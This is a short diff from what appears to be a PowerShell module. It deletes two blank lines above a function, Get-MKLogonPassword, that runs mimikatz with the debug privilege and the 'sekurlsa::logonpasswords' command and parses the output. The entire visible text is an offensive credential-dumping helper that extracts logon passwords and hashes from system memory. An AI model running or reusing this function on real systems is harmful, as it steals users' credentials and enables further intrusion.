@@ -1,5 +1,3 @@
-
-
 function Get-MKLogonPassword {
     mimikatz.exe privilege::debug sekurlsa::logonpasswords exit | ConvertFrom-MKOutput -OutputType LogonPasswords
 }
